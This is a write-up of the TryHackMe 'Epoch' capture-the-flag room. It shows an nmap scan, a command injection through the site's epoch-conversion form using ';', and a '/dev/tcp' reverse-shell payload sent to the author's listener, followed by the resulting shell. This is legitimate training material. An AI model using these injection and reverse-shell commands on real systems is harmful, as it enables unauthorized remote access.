---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Epoch
# DESCRIPTION       . Be honest, you have always wanted an online tool that could help you convert UNIX dates and timestamps! 
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/epoch
```

```
sudo nmap -sSVC -T5 -p- 10.10.244.195 -oN epoch 
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0149f4f3933591fb0fb129138cd8fc04 (RSA)
|   256 c7981b9901cb0538e1a090d23515c4dc (ECDSA)
|_  256 63f31bf18e078df8be4d81a43b7f9f8c (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 28 Feb 2024 16:44:05 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1184
|     Connection: close
|     <!DOCTYPE html>
|     <head>
|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
|     integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
|     <style>
|     body,
|     html {
|     height: 100%;
|     </style>
|     </head>
|     <body>
|     <div class="container h-100">
|     <div class="row mt-5">
|     <div class="col-12 mb-4">
|     class="text-center">Epoch to UTC convertor 
|     </h3>
|     </div>
|     <form class="col-6 mx-auto" action="/">
|     <div class=" input-group">
|     <input name="epoch" value="" type="text" class="form-control" placeholder="Epoch"
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Date: Wed, 28 Feb 2024 16:44:05 GMT
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 18
|     Allow: GET, HEAD
|     Connection: close
	|_    Method Not Allowed
```

#### PORT 80

- the web server is asking for an epoch as input; 

- however, the form is vulnerable to command injection by using `;` to inject UNIX* commands.

```
0
```

```
Thu Jan  1 00:00:00 UTC 1970
```

- However, if we use `;` to inject more commands, they are executed and the output is shown back to us.

```
1;ls;pwd;ls /home; ls -lah;whoami;mkdir .ssh; ls -lah
```

```
Thu Jan  1 00:00:01 UTC 1970
go.mod
go.sum
main
main.go
views
/home/challenge
challenge
total 14M
drwxr-xr-x 1 root root 4.0K Mar  2  2022 .
drwxr-xr-x 1 root root 4.0K Mar  2  2022 ..
-rw-r--r-- 1 root root  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 root root 3.7K Feb 25  2020 .bashrc
-rw-r--r-- 1 root root  807 Feb 25  2020 .profile
-rw-rw-r-- 1 root root  236 Mar  2  2022 go.mod
-rw-rw-r-- 1 root root  52K Mar  2  2022 go.sum
-rwxr-xr-x 1 root root  14M Mar  2  2022 main
-rw-rw-r-- 1 root root 1.2K Mar  2  2022 main.go
drwxrwxr-x 1 root root 4.0K Mar  2  2022 views
challenge
mkdir: cannot create directory '.ssh': Permission denied
total 14M
drwxr-xr-x 1 root root 4.0K Mar  2  2022 .
drwxr-xr-x 1 root root 4.0K Mar  2  2022 ..
-rw-r--r-- 1 root root  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 root root 3.7K Feb 25  2020 .bashrc
-rw-r--r-- 1 root root  807 Feb 25  2020 .profile
-rw-rw-r-- 1 root root  236 Mar  2  2022 go.mod
-rw-rw-r-- 1 root root  52K Mar  2  2022 go.sum
-rwxr-xr-x 1 root root  14M Mar  2  2022 main
-rw-rw-r-- 1 root root 1.2K Mar  2  2022 main.go
drwxrwxr-x 1 root root 4.0K Mar  2  2022 views

```


- In the example above, I tried creating the `.ssh` directory in my home path, next step being creating the `authorized_keys` file to allow me to place a public key in there, leading to SSH authorization using the private key.

- However, the path seems to be owned by root and access is denied.

- This is not really an impairment, as we can execute a command to connect back to a listener of ours, so we can still get access to the server. However, I wanted the SSH approach as it would've been more stable from the beginning.


```
1;sh -i >& /dev/tcp/IP/3132 0>&1
```

```
Listening on 0.0.0.0 3132
Connection received on 10.10.244.195 47616
sh: 0: can't access tty; job control turned off
$ whoami 
challenge
```

#### PRIVILEGE ESCALATION

- Privilege escalation wasn't needed; 
- During my checks I've found the flag by printing the environment variables with `env`.

